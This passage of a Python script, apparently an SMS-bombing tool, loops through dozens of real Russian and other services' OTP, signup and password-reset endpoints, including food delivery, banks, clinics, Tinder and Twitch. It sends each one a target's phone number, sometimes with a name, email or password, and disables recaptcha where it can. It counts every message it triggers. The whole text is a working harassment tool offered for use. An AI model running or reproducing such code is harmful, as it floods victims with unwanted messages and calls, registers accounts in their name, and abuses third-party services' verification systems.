            requests.post('https://www.delivery-club.ru/ajax/user_otp', data={"phone": _phone})
            N += 1
            print('[+] Delivery отправлено! || Кол-во - ' + str(N))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
        try:
            requests.get('https://requests.service.banki.ru/form/960/submit',
                         params={"callback": "submitCallback", "name": _name, "phone": "+" + _phone, "email": _email,
                                 "gorod": "Москва", "approving_data": "1", })
            N += 1
            print('[+] Banki отправлено! || Кол-во - ' + str(N))
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')
        try:
            requests.post('https://api.ivi.ru/mobileapi/user/register/phone/v6', data={"phone": _phone})
            N += 1
            print('[+] IVI отправлено! || Кол-во - ' + str(N))
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')
        try:
            requests.post('https://www.moyo.ua/identity/registration',
                          data={"firstname": _name, "phone": _phone, "email": _email})
            N += 1
            print('[+] Moyo отправлено! || Кол-во - ' + str(N))
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')
        try:
            requests.post('https://helsi.me/api/healthy/accounts/login', json={"phone": _phone, "platform": "PISWeb"})
            N += 1
            print('[+] Helsi отправлено! || Кол-во - ' + str(N))
            time.sleep(0.1)
        except:
            print('[+] не отправлено!')
        try:
            requests.post('https://api.kinoland.com.ua/api/v1/service/send-sms', headers={"Agent": "website"},
                          json={"Phone": _phone, "Type": 1})
            N += 1
            print('[+] KinoLend отправлено! || Кол-во - ' + str(N))
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')
        try:
            requests.post('https://pizzahut.ru/account/password-reset',
                          data={'reset_by': 'phone', 'action_id': 'pass-recovery', 'phone': _phonePizzahut,
                                '_token': '*'})
            N += 1
            print('[+] PizzaHut отправлено! || Кол-во - ' + str(N))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
        try:
            requests.post('https://www.rabota.ru/remind', data={'credential': _phone})
            N += 1
            print('[+] Rabota отправлено! || Кол-во - ' + str(N))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
        try:
            requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+' + _phone})
            N += 1
            print('[+] Rutube отправлено! || Кол-во - ' + str(N))
            time.sleep(0.1)
        except:
            print('[-] Rutube in sent!')
        try:
            requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
            N += 1
            print('[+] Citilink отправлено! || Кол-во - ' + str(N))
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')
        try:
            requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php',
                          data={'name': _name, 'phone': _phone, 'promo': 'yellowforma'})
            N += 1
            print('[+] Smsint отправлено! || Кол-во - ' + str(N))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
        try:
            requests.get(
                'https://www.oyorooms.com/api/pwa/generateotp?phone=' + _phone9 + '&country_code=%2B7&nod=4&locale=en')
            N += 1
            print('[+] oyorooms отправлено! || Кол-во - ' + str(N))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
        try:
            requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',
                          params={"pageName": "registerPrivateUserPhoneVerificatio"},
                          data={"phone": _phone, "recaptcha": "off", "g-recaptcha-response": "", })
            N += 1
            print('[+] MVIDEO отправлено! || Кол-во - ' + str(N))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
        try:
            requests.post('https://newnext.ru/graphql', json={'operationName': 'registration', 'variables': {
                'client': {'firstName': 'Иван', 'lastName': 'Иванов', 'phone': _phone, 'typeKeys': ['Unemployed']}},
                                                              'query': 'mutation registration($client: ClientInput!) {''\n  registration(client: $client) {''\n    token\n    __typename\n  }\n}\n'})
            N += 1
            print('[+] newnext отправлено! || Кол-во - ' + str(N))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
        try:
            requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
            N += 1
            print('[+] Sunlight отправлено! || Кол-во - ' + str(N))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
        try:
            requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',
                          json={'client_type': 'personal', 'email': _email, 'mobile_phone': _phone,
                                'deliveryOption': 'sms'})
            N += 1
            print('[+] alpari отправлено! || Кол-во - ' + str(N))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
        try:
            requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
            N += 1
            print('[+] Invitro отправлено! || Кол-во - ' + str(N))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
        try:
            requests.post('https://online.sbis.ru/reg/service/',
                          json={'jsonrpc': '2.0', 'protocol': '5', 'method': 'Пользователь.ЗаявкаНаФизика',
                                'params': {'phone': _phone}, 'id': '1'})
            N += 1
            print('[+] Sberbank отправлено! || Кол-во - ' + str(N))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
        try:
            requests.post('https://ib.psbank.ru/api/authentication/extendedClientAuthRequest',
                          json={'firstName': 'Иван', 'middleName': 'Иванович', 'lastName': 'Иванов', 'sex': '1',
                                'birthDate': '10.10.2000', 'mobilePhone': _phone9, 'russianFederationResident': 'true',
                                'isDSA': 'false', 'personalDataProcessingAgreement': 'true',
                                'bKIRequestAgreement': 'null', 'promotionAgreement': 'true'})
            N += 1
            print('[+] Psbank отправлено! || Кол-во - ' + str(N))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
        try:
            requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
            N += 1
            print('[+] Beltelcom отправлено! || Кол-во - ' + str(N))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
        try:
            requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone})
            N += 1
            print('[+] Karusel отправлено! || Кол-во - ' + str(N))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
        try:
            requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + _phone})
            N += 1
            print('[+] KFC отправлено! || Кол-во - ' + str(N))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
        try:
            requests.post('https://api.chef.yandex/api/v2/auth/sms', json={"phone": _phone})
            N += 1
            print('[+] Yandex.Chef отправлено! || Кол-во - ' + str(N))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
        try:
            requests.post('https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code',
                          params={"msisdn": _phone})
            N += 1
            print('[+] MTS отправлено! || Кол-во - ' + str(N))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
        try:
            requests.post("https://api.delitime.ru/api/v2/signup",
                          data={"SignupForm[username]": _phone, "SignupForm[device_type]": 3})
            N += 1
            print('[+] Delitime отправлено! || Кол-во - ' + str(N))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
        try:
            requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
            N += 1
            print('[+] findclone звонок отправлен! || Кол-во - ' + str(N))
            time.sleep(0.1)
        except:
            print('[-] Звонок не отпрвлен !')
        try:
            requests.post("https://guru.taxi/api/v1/driver/session/verify",
                          json={"phone": {"code": 1, "number": _phone}})
            N += 1
            print('[+] Guru отправлено! || Кол-во - ' + str(N))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
        try:
            requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',
                          data={'msisdn': _phone, "locale": 'en', 'countryCode': 'ru', 'version': '1',
                                "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
            N += 1
            print('[+] ICQ отправлено! || Кол-во - ' + str(N))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
        try:
            requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru",
                          data={"mode": "request", "phone": "+" + _phone, "phone_permission": "unknown", "stream_id": 0,
                                "v": 3, "appversion": "3.20.6", "osversion": "unknown", "devicemodel": "unknown"})
            N += 1
            print('[+] InDriver отправлено! || Кол-во - ' + str(N))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
        try:
            requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword",
                          data={"password": password, "application": "lkp", "login": "+" + _phone})
            N += 1
            print('[+] Invitro отправлено! || Кол-во - ' + str(N))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
        try:
            requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate', json={"phone": _phone})
            N += 1
            print('[+] Pmsm отправлено! || Кол-во - ' + str(N))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
        try:
            requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6", data={"phone": _phone})
            N += 1
            print('[+] IVI отправлено! || Кол-во - ' + str(N))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
        try:
            requests.post('https://lenta.com/api/v1/authentication/requestValidationCode', json={'phone': '+' + _phone})
            N += 1
            print('[+] Lenta отправлено! || Кол-во - ' + str(N))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
        try:
            requests.post('https://cloud.mail.ru/api/v2/notify/applink',
                          json={"phone": "+" + _phone, "api": 2, "email": "email", "x-email": "x-email"})
            N += 1
            print('[+] Mail.ru отправлено! || Кол-во - ' + str(N))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
        try:
            requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',
                          params={"pageName": "registerPrivateUserPhoneVerificatio"},
                          data={"phone": _phone, "recaptcha": 'off', "g-recaptcha-response": ""})
            N += 1
            print('[+] MVideo отправлено! || Кол-во - ' + str(N))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
        try:
            requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",
                          data={"st.r.phone": "+" + _phone})
            N += 1
            print('[+] OK отправлено! || Кол-во - ' + str(N))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
        try:
            requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code", json={"phone": _phone})
            N += 1
            print('[+] qlean отправлено! || Кол-во - ' + str(N))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
        try:
            requests.post('https://sso.cloud.qlean.ru/http/users/requestotp',
                          headers={"Referer": "https://qlean.ru/sso?redirectUrl=https://qlean.ru/"},
                          params={"phone": _phone, "clientId": "undefined", "sessionId": str(randint(5000, 9999))})
            N += 1
            print('[+] Qlean отправлено! || Кол-во - ' + str(N))
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')
        try:
            requests.post("http://smsgorod.ru/sendsms.php", data={"number": _phone})
            N += 1
            print('[+] SMSgorod отправлено! || Кол-во - ' + str(N))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
        try:
            requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
                          data={'phone_number': _phone})
            N += 1
            print('[+] Tinder отправлено! || Кол-во - ' + str(N))
        except:
            print('[-] error in sent!')
        try:
            requests.post('https://passport.twitch.tv/register?trusted_request=true',
                          json={"birthday": {"day": 11, "month": 11, "year": 1999},
                                "client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,
                                "password": password, "phone_number": _phone, "username": username})
            N += 1
            print('[+] Twitch отправлено! || Кол-во - ' + str(N))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
        try:
            requests.post('https://cabinet.wi-fi.ru/api/auth/by-sms', data={'msisdn': _phone},
                          headers={'App-ID': 'cabinet'})
            N += 1
            print('[+] CabWiFi отправлено! || Кол-во - ' + str(N))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
        try:
            requests.post("https://api.wowworks.ru/v2/site/send-code", json={"phone": _phone, "type": 2})
            N += 1
            print('[+] wowworks отправлено! || Кол-во - ' + str(N))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
        try:
            requests.post('https://eda.yandex/api/v1/user/request_authentication_code',
                          json={"phone_number": "+" + _phone})
            N += 1
            print('[+] Eda.Yandex отправлено! || Кол-во - ' + str(N))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
        try:
            requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
            N += 1
            print('[+] Youla отправлено! || Кол-во - ' + str(N))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
        try:
            requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',
                          json={"client_type": "personal", "email": f"{email}@gmail.ru", "mobile_phone": _phone,
                                "deliveryOption": "sms"})
            N += 1
            print('[+] Alpari отправлено! || Кол-во - ' + str(N))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
        try:
            requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode", data={"phone": _phone})
            N += 1
            print('[+] SMS отправлено! || Кол-во - ' + str(N))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
        try:
            requests.post('https://www.delivery-club.ru/ajax/user_otp', data={"phone": _phone})
            N += 1
            print('[+] Delivery отправлено! || Кол-во - ' + str(N))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
